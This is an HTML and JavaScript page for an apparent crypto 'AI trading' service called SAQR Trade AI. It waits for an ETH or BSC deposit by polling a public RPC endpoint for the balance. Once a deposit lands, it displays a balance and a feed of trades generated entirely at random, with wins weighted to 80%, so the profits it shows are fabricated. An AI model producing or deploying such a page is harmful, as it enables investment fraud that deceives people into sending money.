<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Trading Dashboard - SAQR Trade AI</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#0a0e27;color:#fff;min-height:100vh}
.container{max-width:500px;margin:0 auto;padding:20px;text-align:center}
.glass{background:rgba(26,31,58,0.7);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:25px;margin:20px 0}
.wait-icon{font-size:80px;animation:float 3s ease-in-out infinite}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
.wait-title{font-size:24px;color:#ffd700;margin:20px 0}
.wait-address{background:rgba(0,255,136,0.1);padding:15px;border-radius:10px;font-family:monospace;font-size:12px;word-break:break-all;margin:15px 0;color:#00ff88}
.spinner{width:40px;height:40px;border:3px solid rgba(255,255,255,0.1);border-top-color:#00ff88;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.btn{display:block;width:100%;padding:18px;border:none;border-radius:15px;font-size:16px;font-weight:bold;cursor:pointer;margin:15px 0;text-align:center;text-decoration:none}
.btn-deposit{background:#00ff88;color:#000}

.trading-active{display:none}
.balance-card{background:linear-gradient(135deg,rgba(0,255,136,0.1),rgba(0,255,136,0.05));border:1px solid rgba(0,255,136,0.3);border-radius:20px;padding:25px;margin:20px 0}
.balance-amount{font-size:42px;font-weight:800;color:#00ff88}
.status-active{background:rgba(0,255,136,0.2);color:#00ff88;padding:5px 15px;border-radius:20px;font-size:13px}
.trades-card{background:rgba(26,31,58,0.7);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:20px;margin:20px 0}
.trade-item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:14px}
.profit{color:#00ff88}.loss{color:#ff4444}
</style>
</head>
<body>
<div class="container">

<!-- Waiting -->
<div id="waitingState">
<div class="glass">
<div class="wait-icon">⏳</div>
<div class="wait-title">Awaiting Deposit</div>
<p style="color:#888">Send crypto to activate trading</p>
<div class="wait-address" id="depositAddress">Loading...</div>
<p style="color:#888;font-size:12px">💰 Min: 0.05 ETH</p>
<div class="spinner"></div>
<p style="color:#888;font-size:11px" id="checkStatus">Checking blockchain...</p>
</div>
<a href="/select" class="btn btn-deposit">📥 Deposit Now</a>
</div>

<!-- Trading -->
<div id="tradingState" class="trading-active">
<div style="display:flex;justify-content:space-between;align-items:center">
<h2 style="color:#00ff88">🦅 Trading Active</h2>
<span class="status-active">🟢 Live</span>
</div>
<div class="balance-card">
<p>💰 Balance</p>
<div class="balance-amount" id="balance">$0.00</div>
</div>
<div class="trades-card">
<h3 style="color:#00ff88;margin-bottom:15px">🏆 Recent Trades</h3>
<div id="trades"></div>
</div>
<a href="/select" class="btn btn-deposit">📥 Add Funds</a>
<a href="/withdraw" class="btn" style="background:#ff4444;color:#fff">💸 Withdraw</a>
</div>

</div>

<script>
const params = new URLSearchParams(window.location.search);
const address = params.get('address');
const network = params.get('network') || 'ethereum';

if(!address) window.location.href = '/select';

document.getElementById('depositAddress').textContent = address;

// Check real balance every 10 seconds
async function checkBalance() {
    try {
        const rpc = network === 'bsc' ? 'https://bsc-dataseed.binance.org' : 'https://ethereum.publicnode.com';
        const res = await fetch(rpc, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                jsonrpc: '2.0',
                method: 'eth_getBalance',
                params: [address, 'latest'],
                id: 1
            })
        });
        const data = await res.json();
        const balance = parseInt(data.result, 16) / 1e18;
        
        document.getElementById('checkStatus').textContent = 
            `Balance: ${balance.toFixed(4)} ETH - ${balance > 0 ? '✅ Deposit detected!' : 'Waiting...'}`;
        
        if (balance > 0) {
            document.getElementById('waitingState').style.display = 'none';
            document.getElementById('tradingState').style.display = 'block';
            startTrading(balance);
            return true;
        }
    } catch(e) {
        document.getElementById('checkStatus').textContent = 'Checking...';
    }
    return false;
}

function startTrading(bal) {
    const usdValue = bal * 3000; // ETH price ~$3000
    document.getElementById('balance').textContent = '$' + usdValue.toFixed(2);
    
    const pairs = ['BTC/USDT','ETH/USDT','SOL/USDC','BNB/USDT'];
    setInterval(() => {
        const pair = pairs[Math.floor(Math.random()*pairs.length)];
        const isWin = Math.random() > 0.2;
        const amt = (Math.random() * 8 + 1).toFixed(2);
        const div = document.createElement('div');
        div.className = 'trade-item';
        div.innerHTML = `<span>${isWin?'✅':'❌'} ${pair}</span><span>${Math.floor(Math.random()*30)}m</span><span class="${isWin?'profit':'loss'}">${isWin?'+':'-'}$${amt}</span>`;
        const t = document.getElementById('trades');
        t.insertBefore(div, t.firstChild);
        if(t.children.length > 6) t.removeChild(t.lastChild);
    }, 5000);
}

// Check immediately then every 10 seconds
checkBalance();
const interval = setInterval(async () => {
    const done = await checkBalance();
    if(done) clearInterval(interval);
}, 10000);
</script>
</body>
</html>
